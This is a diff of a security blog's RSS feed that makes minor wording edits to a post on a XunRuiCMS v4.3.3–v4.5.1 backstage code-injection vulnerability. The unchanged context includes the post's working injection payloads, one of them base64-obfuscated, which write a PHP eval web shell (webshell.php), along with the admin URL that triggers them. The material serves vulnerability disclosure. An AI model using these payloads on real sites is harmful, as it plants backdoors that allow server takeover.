@@ -7,12 +7,12 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <lastBuildDate>Tue, 26 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://weltolk.github.io/categories/expliot-db/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file include)</title>
-        <link>https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-include/</link>
+        <title>XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file inclusion)</title>
+        <link>https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/</link>
         <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-include/</guid>
-        <description>&lt;img src="https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-include/expliot-db.png" alt="Featured image of post XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file include)" /&gt;&lt;h2 id=&#34;prerequisite&#34;&gt;prerequisite&lt;/h2&gt;
+        <guid>https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/</guid>
+        <description>&lt;img src="https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/expliot-db.png" alt="Featured image of post XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file inclusion)" /&gt;&lt;h2 id=&#34;prerequisite&#34;&gt;prerequisite&lt;/h2&gt;
 &lt;p&gt;two conditions:&lt;/p&gt;
 &lt;p&gt;1.XunRuiCMS version is v4.3.3 to v4.5.1&lt;/p&gt;
 &lt;p&gt;2.You can log in to the background,And it is an administrator account or have the management permission of &amp;ldquo;应用&amp;rdquo;-&amp;gt;&amp;ldquo;任务队列&amp;rdquo;&lt;/p&gt;
@@ -175,7 +175,7 @@
 &lt;p&gt;After bypassing JSON encoding and &amp;ldquo;XSS cleaning&amp;rdquo;, the content here becomes:&lt;/p&gt;
 &lt;p&gt;[&amp;rsquo;;file_put_contents(&amp;lsquo;webshell.php&amp;rsquo;,htmlspecialchars_decode(&amp;rsquo;&amp;lt;&amp;rsquo;).&amp;rsquo;?php eval&amp;rsquo;.base64_decode(&amp;lsquo;KA==&amp;rsquo;).&amp;rsquo;@$_POST[&amp;rsquo;.base64_decode(&amp;lsquo;Ig==&amp;rsquo;).&amp;lsquo;password&amp;rsquo;.base64_decode(&amp;lsquo;Ig==&amp;rsquo;).&amp;rsquo;]&amp;rsquo;.base64_decode(&amp;lsquo;KQ==&amp;rsquo;).&amp;rsquo;;?&amp;rsquo;.htmlspecialchars_decode(&amp;rsquo;&amp;gt;&amp;rsquo;));return;&amp;rsquo;]&lt;/p&gt;
 &lt;p&gt;The package of &lt;code&gt;&#39;&lt;/code&gt; in document &lt;code&gt;WRITEPATH.&#39;config/cron.php&#39;&lt;/code&gt; is closed&lt;/p&gt;
-&lt;h4 id=&#34;inclusion-the-writepathconfigcronphp-file-written-to&#34;&gt;inclusion the &lt;code&gt;WRITEPATH.&#39;config/cron.php&#39;&lt;/code&gt; file written to&lt;/h4&gt;
+&lt;h4 id=&#34;include-the-writepathconfigcronphp-file-written-to&#34;&gt;include the &lt;code&gt;WRITEPATH.&#39;config/cron.php&#39;&lt;/code&gt; file written to&lt;/h4&gt;
 &lt;p&gt;Through the analysis of add() function, when you call the add() function, you will first include the &lt;code&gt;WRITEPATH.&#39;config/cron.php&#39;&lt;/code&gt; file when it exists, therefore, you can access &lt;code&gt;http://host:port/Admin.php?c=Cron&amp;amp;m=add&lt;/code&gt; directly&lt;/p&gt;
 &lt;p&gt;After accessing &lt;code&gt;http://host:port/Admin.php?c=Cron&amp;amp;m=add&lt;/code&gt;, &lt;code&gt;http://host:port/Admin.php?c=Cron&amp;amp;m=add&lt;/code&gt; file named webshell.php will be generated in the root directory of the website, and the content of the file is &lt;code&gt;&amp;lt;?php eval(@$_POST[&amp;quot;password&amp;quot;]);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;h3 id=&#34;version-v451&#34;&gt;version v4.5.1&lt;/h3&gt;
@@ -358,7 +358,7 @@
 &lt;p&gt;After bypassing the filtering of JSON encoding, &amp;ldquo;XSS cleaning&amp;rdquo; and dr_safe_filename() function, the content here becomes:&lt;/p&gt;
 &lt;p&gt;&amp;quot;:&amp;quot;1&amp;quot;}}&amp;rsquo;;eval(base64_decode(&amp;lsquo;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&amp;rsquo;));return;&amp;rsquo;&lt;/p&gt;
 &lt;p&gt;The package of &lt;code&gt;&#39;&lt;/code&gt; in document &lt;code&gt;WRITEPATH.&#39;config/cron.php&#39;&lt;/code&gt; is closed&lt;/p&gt;
-&lt;h4 id=&#34;inclusion-the-writepathconfigcronphp-file-written-to-1&#34;&gt;inclusion the &lt;code&gt;WRITEPATH.&#39;config/cron.php&#39;&lt;/code&gt; file written to&lt;/h4&gt;
+&lt;h4 id=&#34;include-the-writepathconfigcronphp-file-written-to-1&#34;&gt;include the &lt;code&gt;WRITEPATH.&#39;config/cron.php&#39;&lt;/code&gt; file written to&lt;/h4&gt;
 &lt;p&gt;Through the analysis of the add() function in front, when calling the add() function, the &lt;code&gt;WRITEPATH.&#39;config/cron.php&#39;&lt;/code&gt; file will be included when the &lt;code&gt;WRITEPATH.&#39;config/cron.php&#39;&lt;/code&gt; file exists, so you can directly access &lt;code&gt;http://host:port/Admin.php?c=Cron&amp;amp;m=add&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;After accessing &lt;code&gt;http://host:port/Admin.php?c=Cron&amp;amp;m=add&lt;/code&gt;, &lt;code&gt;http://host:port/Admin.php?c=Cron&amp;amp;m=add&lt;/code&gt; file named webshell.php will be generated in the root directory of the website, and the content of the file is &lt;code&gt;&amp;lt;?php eval(@$_POST[&amp;quot;password&amp;quot;]);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;h3 id=&#34;after-version-v451&#34;&gt;after version v4.5.1&lt;/h3&gt;
